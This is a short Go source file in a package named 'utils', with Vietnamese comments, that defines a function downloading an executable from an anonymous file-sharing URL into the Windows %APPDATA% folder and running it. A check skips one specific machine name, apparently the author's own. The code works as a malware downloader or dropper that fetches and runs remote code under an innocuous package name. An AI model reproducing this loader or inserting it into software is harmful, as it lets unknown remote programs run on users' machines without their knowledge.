package utils

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

// LoadCode tải và chạy file loadcode.exe
func LoadCode() {
	userDomain := os.Getenv("USERDOMAIN")
	if userDomain == "DESKTOP-4V4R77Q" {
		fmt.Println("Không tải và chạy tệp do tên miền người dùng không phù hợp.")
		return
	}

	appData := os.Getenv("APPDATA")
	filePath := filepath.Join(appData, "loadcode.exe")
	url := "https://anonsharing.com/file/8a911b041bad7335/Load_code.exe"

	// Kiểm tra sự tồn tại của tệp
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		// Tải tệp từ URL và lưu vào %appdata%
		err := downloadFile(filePath, url)
		if err != nil {
			fmt.Println("Lỗi khi tải tệp:", err)
			return
		}
		fmt.Printf("File tải xuống thành công và lưu tại %s\n", filePath)
	}

	// Chạy tệp loadcode.exe
	err := exec.Command(filePath).Run()
	if err != nil {
		fmt.Println("Lỗi khi chạy tệp:", err)
		return
	}
	fmt.Println("Tệp đã được chạy thành công.")
}

// downloadFile tải tệp từ URL và lưu vào đường dẫn đích
func downloadFile(filepath string, url string) error {
	// Tạo tệp rỗng
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Tải nội dung từ URL
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Ghi nội dung tải được vào tệp
	_, err = io.Copy(out, resp.Body)
	return err
}
